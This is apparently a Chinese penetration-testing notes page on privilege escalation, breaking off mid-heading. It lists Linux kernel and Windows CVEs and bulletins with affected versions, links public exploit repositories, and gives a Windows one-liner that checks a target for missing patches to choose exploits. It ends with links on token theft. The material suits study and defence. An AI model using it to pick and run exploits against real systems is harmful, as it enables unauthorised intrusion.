    <content type="html"><![CDATA[<h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><h2 id="6-1-操作系统提权"><a href="#6-1-操作系统提权" class="headerlink" title="6.1 操作系统提权"></a>6.1 操作系统提权</h2><h3 id="6-1-1-Linux"><a href="#6-1-1-Linux" class="headerlink" title="6.1.1 Linux"></a>6.1.1 Linux</h3><h4 id="6-1-1-1-Linux提权-依赖exp"><a href="#6-1-1-1-Linux提权-依赖exp" class="headerlink" title="6.1.1.1 Linux提权-依赖exp"></a>6.1.1.1 Linux提权-依赖exp</h4><p><strong>exp注：</strong></p><pre><code class="hljs subunit">CVE<span class="hljs-string">-2017</span><span class="hljs-string">-1000367</span> [Sudo] (Sudo 1.8.6p7 - 1.8.20)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-1000112</span> [a memory corruption due to UFO to non-UFO path switch]CVE<span class="hljs-string">-2017</span><span class="hljs-string">-7494</span> [Samba Remote execution] (Samba 3.5.0<span class="hljs-string">-4</span>.6.4/4.5.10/4.4.14)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-7308</span> [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-6074</span> [a double-free in DCCP protocol] (Linux kernel through 4.9.11)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-5123</span> [&#x27;waitid()&#x27;] (Kernel 4.14.0-rc4+)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-9793</span> [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-5195</span> [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))CVE<span class="hljs-string">-2016</span><span class="hljs-string">-2384</span> [a double-free in USB MIDI driver]  (Linux kernel before 4.5)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-0728</span> [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE<span class="hljs-string">-2015</span><span class="hljs-string">-7547</span> [glibc getaddrinfo] (before Glibc 2.9)CVE<span class="hljs-string">-2015</span><span class="hljs-string">-1328</span> [overlayfs] (3.13, 3.16.0, 3.19.0)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-5284</span> [OSSEC] (2.8)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-4699</span> [ptrace] (before 3.15.4)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-4014</span> [Local Privilege Escalation] (before 3.14.8)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-3153</span> [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-0196</span> [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-0038</span> [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-2094</span> [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-1858</span> [clown-newuser] (3.3<span class="hljs-string">-3</span>.8)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-1763</span> [__sock_diag_rcv_msg] (before 3.8.3)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-0268</span> [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)CVE<span class="hljs-string">-2012</span><span class="hljs-string">-3524</span> [libdbus] (libdbus 1.5.x and earlier)CVE<span class="hljs-string">-2012</span><span class="hljs-string">-0056</span> [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4347</span> [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4258</span> [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4073</span> [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3904</span> [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3437</span> [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3301</span> [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3081</span> [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-2959</span> [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-1146</span> [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-0415</span> [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-3547</span> [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2698</span> [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2692</span> [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2692</span> [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-1337</span> [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-1185</span> [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-4210</span> [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-0600</span> [vmsplice2] (2.6.23, 2.6.24)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-0600</span> [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)CVE<span class="hljs-string">-2006</span><span class="hljs-string">-3626</span> [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)CVE<span class="hljs-string">-2006</span><span class="hljs-string">-2451</span> [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)CVE<span class="hljs-string">-2005</span><span class="hljs-string">-0736</span> [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)CVE<span class="hljs-string">-2005</span><span class="hljs-string">-1263</span> [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)CVE<span class="hljs-string">-2004</span><span class="hljs-string">-1235</span> [elflbl] (2.4.29)CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2004</span><span class="hljs-string">-0077</span> [mremap_pte] (2.4.20, 2.2.24, 2.4.25, 2.4.26, 2.4.27)</code></pre><p><strong>已对外公开 exp 注：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>linux-kernel-exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Kabot/</span>Unix-Privilege-Escalation-Exploits-Pack/https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/xairy/</span>kernel-exploits</code></pre><hr><h4 id="6-1-1-2-Sudo漏洞分析-CVE-2019-14287"><a href="#6-1-1-2-Sudo漏洞分析-CVE-2019-14287" class="headerlink" title="6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)"></a>6.1.1.2 Sudo漏洞分析 (CVE-2019-14287)</h4><pre><code class="hljs gradle">sudo -V | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;Sudo version&#x27;</span></code></pre><p>即可查看是否受到该版本（低于1.8.29）的影响</p><p>参考</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.sudo.ws<span class="hljs-regexp">/alerts/mi</span>nus_1_uid.htmlhttps:<span class="hljs-regexp">//</span>www.sudo.ws<span class="hljs-regexp">/sudo/m</span>an<span class="hljs-regexp">/1.8.2/</span>sudoers.man.htmlhttps:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">217089</span>.html</code></pre><hr><h4 id="6-1-1-3-Linux提权之内核提权"><a href="#6-1-1-3-Linux提权之内核提权" class="headerlink" title="6.1.1.3 Linux提权之内核提权"></a>6.1.1.3 Linux提权之内核提权</h4><pre><code class="hljs applescript">anquanke.com/post/<span class="hljs-built_in">id</span>/<span class="hljs-number">98628</span>  <span class="hljs-comment">---详解Linux权限提升的攻击与防护</span></code></pre><p>这两篇文章写得非常好，仔细看完就懂了…</p><hr><h3 id="6-1-2-Windows"><a href="#6-1-2-Windows" class="headerlink" title="6.1.2 Windows"></a>6.1.2 Windows</h3><h4 id="6-1-2-1-windows提权-快速查找exp"><a href="#6-1-2-1-windows提权-快速查找exp" class="headerlink" title="6.1.2.1 windows提权-快速查找exp"></a>6.1.2.1 windows提权-快速查找exp</h4><p>微软官方时刻关注列表网址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>technet.microsoft.com<span class="hljs-regexp">/zh-cn/</span>library<span class="hljs-regexp">/security/</span>dn639106.aspx</code></pre><p>地址更新为：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>docs.microsoft.com<span class="hljs-regexp">/zh-cn/</span>security-updates<span class="hljs-regexp">/securitybulletins/</span><span class="hljs-number">2017</span>/securitybulletins2017</code></pre><p>比如常用的几个已公布的 exp：</p><pre><code class="hljs dns">KB<span class="hljs-number">2592799</span>KB<span class="hljs-number">3000061</span>KB<span class="hljs-number">2592799</span>...</code></pre><p>快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p><pre><code class="hljs less"><span class="hljs-selector-tag">systeminfo</span>&gt;<span class="hljs-selector-tag">micropoor</span><span class="hljs-selector-class">.txt</span><span class="hljs-selector-tag">&amp;</span>(for %i in ( KB977165 KB2160329 KB2503665 KB2592799KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904KB3134228 KB3143141 KB3141780 ) do <span class="hljs-variable">@type</span> micropoor.txt|<span class="hljs-variable">@find</span> /i<span class="hljs-string">&quot;%i&quot;</span>|| <span class="hljs-variable">@echo</span> %i you can fuck)<span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">del</span> /<span class="hljs-selector-tag">f</span> /<span class="hljs-selector-tag">q</span> /<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">micropoor</span><span class="hljs-selector-class">.txt</span></code></pre><p>注：以上需要在可写目录执行。需要临时生成micrpoor.txt，以上补丁编号请根据环境来增删</p><p><strong>exp注：</strong></p><pre><code class="hljs gradle">MS17-<span class="hljs-number">017</span> [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows <span class="hljs-number">7</span>/<span class="hljs-number">8</span>)CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">8464</span> [LNK Remote Code Execution Vulnerability] (windows <span class="hljs-number">10</span><span class="hljs-regexp">/8.1/</span><span class="hljs-number">7</span><span class="hljs-regexp">/2016/</span><span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>）CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">0213</span> [Windows COM Elevation of Privilege Vulnerability] (windows <span class="hljs-number">10</span><span class="hljs-regexp">/8.1/</span><span class="hljs-number">7</span><span class="hljs-regexp">/2016/</span><span class="hljs-number">2010</span>/<span class="hljs-number">2008</span>)MS17-<span class="hljs-number">010</span> [KB4013389] [Windows Kernel Mode Drivers](windows <span class="hljs-number">7</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2003</span>/XP)MS16-<span class="hljs-number">135</span> [KB3199135] [Windows Kernel Mode Drivers] (<span class="hljs-number">2016</span>)MS16-<span class="hljs-number">111</span> [KB3186973] [kernel api] (Windows <span class="hljs-number">10</span> <span class="hljs-number">10586</span> (<span class="hljs-number">32</span><span class="hljs-regexp">/64)/</span><span class="hljs-number">8.1</span>)MS16-<span class="hljs-number">098</span> [KB3178466] [Kernel Driver] (Win <span class="hljs-number">8.1</span>)MS16-<span class="hljs-number">075</span> [KB3164038] [Hot Potato] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">034</span> [KB3143145] [Kernel Driver] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span><span class="hljs-regexp">/10/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">032</span> [KB3143141] [Secondary Logon Handle] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span><span class="hljs-regexp">/10/</span><span class="hljs-number">2012</span>)MS16-<span class="hljs-number">016</span> [KB3136041] [WebDAV] (<span class="hljs-number">2008</span><span class="hljs-regexp">/Vista/</span><span class="hljs-number">7</span>)MS15-<span class="hljs-number">097</span> [KB3089656] [remote code execution] (win8.<span class="hljs-number">1</span>/<span class="hljs-number">2012</span>)MS15-<span class="hljs-number">076</span> [KB3067505] [RPC] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">077</span> [KB3077657] [ATM] (XP<span class="hljs-regexp">/Vista/</span>Win7<span class="hljs-regexp">/Win8/</span><span class="hljs-number">2000</span><span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span>/<span class="hljs-number">2012</span>)MS15-<span class="hljs-number">061</span> [KB3057839] [Kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">051</span> [KB3057191] [Windows Kernel Mode Drivers] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/8/</span><span class="hljs-number">2012</span>)MS15-<span class="hljs-number">010</span> [KB3036220] [Kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/<span class="hljs-number">8</span>)MS15-<span class="hljs-number">015</span> [KB3031432] [Kernel Driver] (Win7<span class="hljs-regexp">/8/</span><span class="hljs-number">8.1</span><span class="hljs-regexp">/2012/</span>RT<span class="hljs-regexp">/2012 R2/</span><span class="hljs-number">2008</span> R2)MS15-<span class="hljs-number">001</span> [KB3023266] [Kernel Driver] (<span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span><span class="hljs-number">7</span>/<span class="hljs-number">8</span>)MS14-<span class="hljs-number">070</span> [KB2989935] [Kernel Driver] (<span class="hljs-number">2003</span>)MS14-<span class="hljs-number">068</span> [KB3011780] [Domain Privilege Escalation] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">058</span> [KB3000061] [Win32k.sys] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">040</span> [KB2975684] [AFD Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/7/</span><span class="hljs-number">8</span>)MS14-<span class="hljs-number">002</span> [KB2914368] [NDProxy] (<span class="hljs-number">2003</span>/XP)MS13-<span class="hljs-number">053</span> [KB2850851] [win32k.sys] (XP<span class="hljs-regexp">/Vista/</span><span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span>win <span class="hljs-number">7</span>)MS13-<span class="hljs-number">046</span> [KB2840221] [dxgkrnl.sys] (Vista<span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span><span class="hljs-number">7</span>)MS13-<span class="hljs-number">005</span> [KB2778930] [Kernel Mode Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">2012</span><span class="hljs-regexp">/win7/</span><span class="hljs-number">8</span>)MS12-<span class="hljs-number">042</span> [KB2972621] [Service Bus] (<span class="hljs-number">2008</span><span class="hljs-regexp">/2012/</span>win7)MS12-<span class="hljs-number">020</span> [KB2671387] [RDP] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS11-<span class="hljs-number">080</span> [KB2592799] [AFD.sys] (<span class="hljs-number">2003</span>/XP)MS11-<span class="hljs-number">062</span> [KB2566454] [NDISTAPI] (<span class="hljs-number">2003</span>/XP)MS11-<span class="hljs-number">046</span> [KB2503665] [AFD.sys] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS11-<span class="hljs-number">011</span> [KB2393802] [kernel Driver] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span><span class="hljs-regexp">/XP/</span>Vista)MS10-<span class="hljs-number">092</span> [KB2305420] [<span class="hljs-keyword">Task</span> Scheduler] (<span class="hljs-number">2008</span>/<span class="hljs-number">7</span>)MS10-<span class="hljs-number">065</span> [KB2267960] [FastCGI] (IIS <span class="hljs-number">5.1</span>, <span class="hljs-number">6.0</span>, <span class="hljs-number">7.0</span>, and <span class="hljs-number">7.5</span>)MS10-<span class="hljs-number">059</span> [KB982799] [ACL-Churraskito] (<span class="hljs-number">2008</span><span class="hljs-regexp">/7/</span>Vista)MS10-<span class="hljs-number">048</span> [KB2160329] [win32k.sys] (XP SP2 &amp; SP3<span class="hljs-regexp">/2003 SP2/</span>Vista SP1 &amp; SP2<span class="hljs-regexp">/2008 Gold &amp; SP2 &amp; R2/</span>Win7)MS10-<span class="hljs-number">015</span> [KB977165] [KiTrap0D] (<span class="hljs-number">2003</span><span class="hljs-regexp">/2008/</span><span class="hljs-number">7</span>/XP)MS10-<span class="hljs-number">012</span> [KB971468] [SMB Client Trans2 stack overflow] (Windows <span class="hljs-number">7</span>/<span class="hljs-number">2008</span>R2)MS09-<span class="hljs-number">050</span> [KB975517][Remote Code Execution] (<span class="hljs-number">2008</span>/Vista)MS09-<span class="hljs-number">020</span> [KB970483] [IIS <span class="hljs-number">6.0</span>] (IIS <span class="hljs-number">5.1</span> and <span class="hljs-number">6.0</span>)MS09-<span class="hljs-number">012</span> [KB959454] [Chimichurri] (Vista<span class="hljs-regexp">/win7/</span><span class="hljs-number">2008</span>/Vista)MS08-<span class="hljs-number">068</span> [KB957097] [Remote Code Execution] (<span class="hljs-number">2000</span>/XP)MS08-<span class="hljs-number">067</span> [KB958644] [Remote Code Execution] (Windows <span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span>Server <span class="hljs-number">2003</span><span class="hljs-regexp">/Vista/</span>Server <span class="hljs-number">2008</span>)MS08-<span class="hljs-number">066</span> [] [] (Windows <span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span>Server <span class="hljs-number">2003</span>)MS08-<span class="hljs-number">025</span> [KB941693] [Win32.sys] (XP<span class="hljs-regexp">/2003/</span><span class="hljs-number">2008</span>/Vista)MS06-<span class="hljs-number">040</span> [KB921883] [Remote Code Execution] (<span class="hljs-number">2003</span><span class="hljs-regexp">/xp/</span><span class="hljs-number">2000</span>)MS05-<span class="hljs-number">039</span> [KB899588] [PnP Service] (Win <span class="hljs-number">9</span>X<span class="hljs-regexp">/ME/</span>NT<span class="hljs-regexp">/2000/</span>XP/<span class="hljs-number">2003</span>)MS03-<span class="hljs-number">026</span> [KB823980] [Buffer Overrun In RPC <span class="hljs-keyword">Interface</span>] (<span class="hljs-regexp">/NT/</span><span class="hljs-number">2000</span><span class="hljs-regexp">/XP/</span><span class="hljs-number">2003</span>)</code></pre><p><strong>已对外公开exp注：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WindowsExploits/</span>Exploitshttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AusJock/</span>Privilege-Escalation</code></pre><hr><h4 id="6-1-2-2-Token窃取与利用"><a href="#6-1-2-2-Token窃取与利用" class="headerlink" title="6.1.2.2 Token窃取与利用"></a>6.1.2.2 Token窃取与利用</h4><pre><code class="hljs asciidoc">https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Token窃取与利用/https://www.xianfish.xyz/2020/01/04/Token窃取与利用/<span class="hljs-link">https://edu.heibai.org/Micro8-渗透沉思录/第一百一十课：窃取,伪造模拟各种windows访问令牌</span>[<span class="hljs-string">token利用</span>].pdf<span class="hljs-link">https://gogs.coooool.club/jee/MICRO/src/573628d1dd817622347dfab242af55bdebfd586b/第一百一十课：窃取,伪造模拟各种windows访问令牌</span>[<span class="hljs-string">token利用</span>].pdf</code></pre><p>看完这四个文章，在复现下期中的一些原理，就摸透了Token窃取与利用！！！</p><hr><h4 id="6-1-2-3-CVE2019-1388-Windows-UAC-提权漏洞"><a href="#6-1-2-3-CVE2019-1388-Windows-UAC-提权漏洞" class="headerlink" title="6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞"></a>6.1.2.3 CVE2019-1388 Windows UAC 提权漏洞</h4><p><strong>参考链接：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ajsafe.com<span class="hljs-regexp">/news/</span><span class="hljs-number">58</span>.htmlhttp:<span class="hljs-regexp">//</span>blog.leanote.com<span class="hljs-regexp">/post/</span>snowming/<span class="hljs-number">38069</span>f423c76https:<span class="hljs-regexp">//</span>portal.msrc.microsoft.com<span class="hljs-regexp">/en-US/</span>security-guidance<span class="hljs-regexp">/advisory/</span>CVE-<span class="hljs-number">2019</span>-<span class="hljs-number">1388</span></code></pre><hr><h4 id="6-1-3-第三方组件提权"><a 